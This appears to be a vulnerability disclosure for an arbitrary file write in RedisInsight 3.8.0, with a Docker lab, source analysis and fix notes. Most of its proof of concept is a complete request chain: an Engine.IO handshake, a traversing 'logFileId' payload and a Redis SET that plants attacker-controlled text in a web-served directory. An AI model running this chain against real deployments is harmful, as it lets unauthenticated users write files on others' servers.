### Vulnerability details

**Official website / Product:** https://redis.io/insight/ / https://github.com/redis/RedisInsight

**Repository:** redis/RedisInsight (stars at selection: 8930)

**Vulnerability type:** file_upload (Profiler `logFileId` path traversal → arbitrary file write / AFW)

**Vulnerability versions:** 3.8.0 (Docker image `redis/redisinsight:3.8.0`; source tag `3.8.0` / `bdbb6eca1fcca1bb8a79ac28dc26a7a27fa30541`); sink still present on `main`

**Vulnerability URL / Parameter:** Socket.IO namespace `/monitor`, event `monitor`, JSON field `logFileId` (delivered over Engine.IO HTTP long-polling); written file readable via default static mount `GET /plugins/<file>`

**Complex:** yes

### Verification procedure

1. Start the lab: `docker compose -f labs/redisinsight-r72-a3/docker-compose.yml up -d`. Images: `redis/redisinsight:3.8.0` (container `redisinsight-r72-a3`, host **25203**→5540) + companion `redis:7.2-alpine` (container `redisinsight-r72-a3-redis`, host **25213**→6379, no password). Compose sets `RI_ACCEPT_TERMS_AND_CONDITIONS=true` and `RI_ENCRYPTION_KEY=r72a3-lab-encryption-key-32b!`. `RI_CUSTOM_TUTORIALS_ENABLED=true` is only for extra experiments; this AFW does not depend on that flag (`/data/plugins` is mounted as static by default). Full compose:

```yaml
services:
  redisinsight:
    image: redis/redisinsight:3.8.0
    container_name: redisinsight-r72-a3
    ports:
      - "25203:5540"
    environment:
      - RI_APP_HOST=0.0.0.0
      - RI_APP_PORT=5540
      - RI_CUSTOM_TUTORIALS_ENABLED=true
      - RI_ACCEPT_TERMS_AND_CONDITIONS=true
      - RI_ENCRYPTION_KEY=r72a3-lab-encryption-key-32b!
    volumes:
      - ri-data:/data
    restart: unless-stopped
  redis:
    image: redis:7.2-alpine
    container_name: redisinsight-r72-a3-redis
    ports:
      - "25213:6379"
volumes:
  ri-data:
```

Expected `docker compose ps` shape:

```
NAME                        IMAGE                      STATUS         PORTS
redisinsight-r72-a3         redis/redisinsight:3.8.0   Up             0.0.0.0:25203->5540/tcp
redisinsight-r72-a3-redis   redis:7.2-alpine           Up             0.0.0.0:25213->6379/tcp
```

App version 3.8.0, image buildCommitSha `815499a8e90021a1babd3ada48217a89fdd702d1`; audited source tag `3.8.0` (`bdbb6eca1fcca1bb8a79ac28dc26a7a27fa30541`).

2. No login required. `POST /api/databases` to add the compose-network Redis (`host` = service name `redis` or container name `redisinsight-r72-a3-redis`, `port` 6379); record response `id` (lab value `92c02834-e8ee-43ec-9fb4-2e09f2473d13`; use the id your instance returns).
3. Engine.IO HTTP long-polling handshake (always include `instanceId=<dbId>`):
   - `GET /socket.io/?EIO=4&transport=polling&instanceId=<dbId>` → `0{"sid":"<sid>",...}`; record `sid`.
   - `POST ...&sid=<sid>&instanceId=<dbId>` body `40/monitor,` → `ok`; then `GET` the same URL → `40/monitor,{"sid":"<nsSid>"}` (namespace `/monitor`).
4. Emit Socket.IO event `monitor` with ACK and a traversing `logFileId` into `/data/plugins/` (full trigger request below). Polling `GET` returns `43/monitor,1[{"status":"ok"}]`.
5. Write attacker-controlled content to the companion Redis so MONITOR flushes, e.g. `redis-cli -h 127.0.0.1 -p 25213 SET r72a3_poc R72A3_AFW_ATTACKER_CONTROLLED_CONTENT` (any client from the Insight network works; evidence shows HELLO/CLIENT SETINFO lines from redis-py).
6. `GET /plugins/r72a3-poc-final.txt` returns HTTP 200 whose body includes the attacker-controlled SET value; the container file is `/data/plugins/r72a3-poc-final.txt` (outside intended `/tmp`). Cross-check with `docker exec redisinsight-r72-a3 ls -la /data/plugins/r72a3-poc-final.txt`.

### Complete vulnerability PoC

**Prep — add companion Redis database (fields from CreateDatabaseDto; `id` is server-generated):**

```http
POST /api/databases HTTP/1.1
Host: 127.0.0.1:25203
User-Agent: r72-a3-poc/1.0
Accept: application/json
Content-Type: application/json
Connection: close
Content-Length: 72

{"host":"redis","port":6379,"name":"r72a3-lab-redis"}
```

Success JSON includes `"id":"<uuid>"` (lab value `92c02834-e8ee-43ec-9fb4-2e09f2473d13`). Subsequent Socket.IO `instanceId` query params must equal that `id`.

**Full Engine.IO handshake + join `/monitor` namespace (Docker-verified five-packet chain):**

Packet 0 — open polling:

```http
GET /socket.io/?EIO=4&transport=polling&instanceId=92c02834-e8ee-43ec-9fb4-2e09f2473d13 HTTP/1.1
Host: 127.0.0.1:25203
User-Agent: r72-a3-poc/1.0
Accept: */*
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8
Content-Length: 118
cache-control: no-store
Date: Mon, 02 Nov 2026 19:44:37 GMT
Connection: close

0{"sid":"LMmCYWytbnkxP0sUAAAP","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":20000,"maxPayload":1000000}
```

Packet 1 — join namespace `/monitor`:

```http
POST /socket.io/?EIO=4&transport=polling&sid=LMmCYWytbnkxP0sUAAAP&instanceId=92c02834-e8ee-43ec-9fb4-2e09f2473d13 HTTP/1.1
Host: 127.0.0.1:25203
User-Agent: r72-a3-poc/1.0
Accept: */*
Connection: close
Content-Type: text/plain;charset=UTF-8
Content-Length: 11

40/monitor,
```

```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 2
cache-control: no-store
Date: Mon, 02 Nov 2026 19:44:37 GMT
Connection: close

ok
```

Packet 2 — poll for namespace sid:

```http
GET /socket.io/?EIO=4&transport=polling&sid=LMmCYWytbnkxP0sUAAAP&instanceId=92c02834-e8ee-43ec-9fb4-2e09f2473d13 HTTP/1.1
Host: 127.0.0.1:25203
User-Agent: r72-a3-poc/1.0
Accept: */*
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8
Content-Length: 41
cache-control: no-store
Date: Mon, 02 Nov 2026 19:44:37 GMT
Connection: close

40/monitor,{"sid":"XxJa7eU4oKKinmtdAAAQ"}
```

**Trigger — Engine.IO polling delivery of Profiler `monitor` (Docker-verified):**

```http
POST /socket.io/?EIO=4&transport=polling&sid=LMmCYWytbnkxP0sUAAAP&instanceId=92c02834-e8ee-43ec-9fb4-2e09f2473d13 HTTP/1.1
Host: 127.0.0.1:25203
User-Agent: r72-a3-poc/1.0
Accept: */*
Connection: close
Content-Type: text/plain;charset=UTF-8
Content-Length: 75

42/monitor,1["monitor",{"logFileId":"../data/plugins/r72a3-poc-final.txt"}]
```

Immediate response to the trigger POST is `ok` (Engine.IO receive ack):

```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 2
cache-control: no-store
Date: Mon, 02 Nov 2026 19:44:37 GMT
Connection: close

ok
```

The following poll returns the Socket.IO ACK:

```http
GET /socket.io/?EIO=4&transport=polling&sid=LMmCYWytbnkxP0sUAAAP&instanceId=92c02834-e8ee-43ec-9fb4-2e09f2473d13 HTTP/1.1
Host: 127.0.0.1:25203
User-Agent: r72-a3-poc/1.0
Accept: */*
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8
Content-Length: 29
cache-control: no-store
Date: Mon, 02 Nov 2026 19:44:37 GMT
Connection: close

43/monitor,1[{"status":"ok"}]
```

Write attacker-controlled content to companion Redis (flush MONITOR to disk):

```bash
redis-cli -h 127.0.0.1 -p 25213 SET r72a3_poc R72A3_AFW_ATTACKER_CONTROLLED_CONTENT
```

**Impact fetch (default static mount after the write):**

```http
GET /plugins/r72a3-poc-final.txt HTTP/1.1
Host: 127.0.0.1:25203
User-Agent: r72-a3-poc/1.0
Accept: */*
Connection: close
```

Complete HTTP response (Docker-verified raw response proving unexpected-path content with attacker-controlled bytes):

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Mon, 02 Nov 2026 19:44:37 GMT
ETag: W/"130-1a19dcad2fa"
Content-Type: text/plain; charset=utf-8
Content-Length: 304
Date: Mon, 02 Nov 2026 19:44:39 GMT
Connection: close

1793648677.620192 [0 172.18.0.1:59014] "HELLO" "3"
1793648677.620674 [0 172.18.0.1:59014] "CLIENT" "SETINFO" "LIB-NAME" "redis-py"
1793648677.620998 [0 172.18.0.1:59014] "CLIENT" "SETINFO" "LIB-VER" "8.1.0"
1793648677.621371 [0 172.18.0.1:59014] "SET" "r72a3_poc" "R72A3_AFW_ATTACKER_CONTROLLED_CONTENT"
```

In-container cross-check (expected output):

```bash
$ docker exec redisinsight-r72-a3 ls -la /data/plugins/r72a3-poc-final.txt
-rw-r--r--    1 node     node           304 Nov  2 19:44 /data/plugins/r72a3-poc-final.txt

$ docker exec redisinsight-r72-a3 cat /data/plugins/r72a3-poc-final.txt
1793648677.620192 [0 172.18.0.1:59014] "HELLO" "3"
...
1793648677.621371 [0 172.18.0.1:59014] "SET" "r72a3_poc" "R72A3_AFW_ATTACKER_CONTROLLED_CONTENT"

$ curl -sS http://127.0.0.1:25203/plugins/r72a3-poc-final.txt
(same body; HTTP 200)
```

Intended path would have been under `/tmp/<id>`; traversal `../data/plugins/` escapes `tmpDir`.

Verification result notes:

- `logFileId=../data/plugins/r72a3-poc-final.txt` resolves via `path.join(os.tmpdir(), id)` to `/data/plugins/r72a3-poc-final.txt`, escaping the intended `/tmp` log directory.
- MONITOR batches append Redis command arguments (including attacker `SET` strings) to that path; `fs.ensureFileSync` creates parent directories.
- Docker builds always serve `customPlugins` (`/data/plugins`) at `GET /plugins/`, so the planted file is HTTP-readable.
- RedisInsight Docker has no login by default. This is **host filesystem AFW in the Insight process**, not the designed Workbench/CLI “run Redis commands” feature.

### Vulnerability analysis

The Profiler gateway forwards client `MonitorSettings.logFileId` into `LogFileProvider.getOrCreate`. `LogFile` sets `this.filePath = join(DIR_PATH.tmpDir, this.id)`. `MonitorSettings` only validates `@IsString()` — no “must stay under tmpDir” check — so `join('/tmp', '../data/plugins/x')` becomes `/data/plugins/x`. `FileLogsEmitter.emit` then calls `getWriteStream()` → `fs.ensureFileSync` + `createWriteStream(..., { flags: 'a' })` and writes MONITOR text. Anyone who can issue Redis commands on a monitored instance (here: unauth companion Redis, or any DB saved in Insight) can place attacker-controlled argument bytes on an unexpected path.

This is unrelated to designed Workbench/CLI execution against Redis; it is a path-handling bug in Insight’s own Profiler log persistence.

Trigger / sink source (full path and line numbers, tag 3.8.0):

```typescript
# File: redisinsight/api/src/modules/profiler/models/monitor-settings.ts
# Lines: 1-6
import { IsString } from 'class-validator';

export class MonitorSettings {
  @IsString()
  logFileId: string;
}
```

```typescript
# File: redisinsight/api/src/modules/profiler/profiler.gateway.ts
# Lines: 42-55
  @SubscribeMessage(ProfilerClientEvents.Monitor)
  async monitor(
    @WSSessionMetadata() sessionMetadata: SessionMetadata,
    @ConnectedSocket() client: Socket,
    @Body() settings: MonitorSettings = null,
  ): Promise<any> {
    try {
      await this.service.addListenerForInstance(
        sessionMetadata,
        ProfilerGateway.getInstanceId(client),
        client,
        settings,
      );
      return { status: 'ok' };
```

```typescript
# File: redisinsight/api/src/modules/profiler/providers/profiler-client.provider.ts
# Lines: 29-41
      if (settings?.logFileId) {
        const profilerLogFile = this.logFileProvider.getOrCreate(
          instanceId,
          settings.logFileId,
          sessionMetadata,
          database,
        );
        // ...
        clientObserver.addLogsEmitter(await profilerLogFile.getEmitter());
      }
```

```typescript
# File: redisinsight/api/src/modules/profiler/models/log-file.ts
# Lines: 45-61
    this.instanceId = instanceId;
    this.id = id;
    this.alias = id;
    this.filePath = join(DIR_PATH.tmpDir, this.id);
    // ...
  getWriteStream(): WriteStream {
    if (!this.writeStream) {
      fs.ensureFileSync(this.filePath);
      this.writeStream = fs.createWriteStream(this.filePath, { flags: 'a' });
    }
```

```typescript
# File: redisinsight/api/src/modules/profiler/emitters/file.logs-emitter.ts
# Lines: 17-32
  async emit(items: any[]) {
    // ...
      const text = items
        .map((item) => {
          const args = item.args
            .map((arg) => `${JSON.stringify(arg)}`)
            .join(' ');
          return `${item.time} [${item.database} ${item.source}] ${args}`;
        })
        .join('\n');

      this.logFile.getWriteStream().write(`${text}\n`);
```

### Fix notes

- Restrict `logFileId` to a safe charset (e.g. UUID); reject `/`, `\\`, `..`.
- After resolve, enforce the final path stays inside `tmpdir` (beware prefix checks without a trailing separator).
- Apply ValidationPipe to the WebSocket DTO and add a dedicated `@IsSafeLogFileId()` validator.
